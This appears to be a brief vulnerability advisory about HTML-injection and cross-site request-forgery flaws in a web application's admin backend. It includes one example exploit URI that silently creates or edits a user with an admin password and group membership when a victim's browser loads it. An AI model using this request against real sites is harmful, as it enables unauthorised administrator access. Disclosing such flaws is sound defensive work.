An attacker can exploit HTML-injection issues through a browser. To exploit the cross-site request-forgery issue, an attacker must entice an unsuspecting user into visiting a malicious site.

The following example URI is available:

http://www.example.com/admin/backend/window/loadClass/saveItem?noCache=1277145391050&amp;rsn=1&amp;username=admin&amp;passwd=admin&amp;email=suck2%40example.org&amp;groups=%221%22&amp;module=users&amp;code=users%2FeditMe%2F
